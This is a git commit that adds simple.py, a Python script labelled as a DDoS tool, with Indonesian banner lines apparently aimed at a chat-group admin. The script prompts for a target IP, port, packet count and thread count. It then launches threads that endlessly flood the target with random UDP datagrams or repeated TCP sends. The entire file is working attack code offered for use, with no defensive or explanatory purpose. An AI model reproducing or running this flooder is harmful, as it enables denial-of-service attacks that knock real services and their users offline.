e366fd82b0ad3fc59f5444d29ac5684ec76fdcc6
Chajerd <90998250+Chajerd@users.noreply.github.com>
2021-09-23 23:49:41 +0800

    Add files via upload

---
+++ simple.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+#Code by MR.X
+import random
+import socket
+import threading
+
+print("DDOS TOOLS HAZIQ")
+print("KHUSUS ADMIN CIRP YANG SANGEAN")
+print("YAUDH YU MULAI")
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(1180)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" SABAR YA ADMIN SEDANG DI PERJALANAN!!!")
+		except:
+			print("[!] GAGALTOD!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" KIMOCHI KIMOCHI!!!")
+		except:
+			s.close()
+			print("[*] Error")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
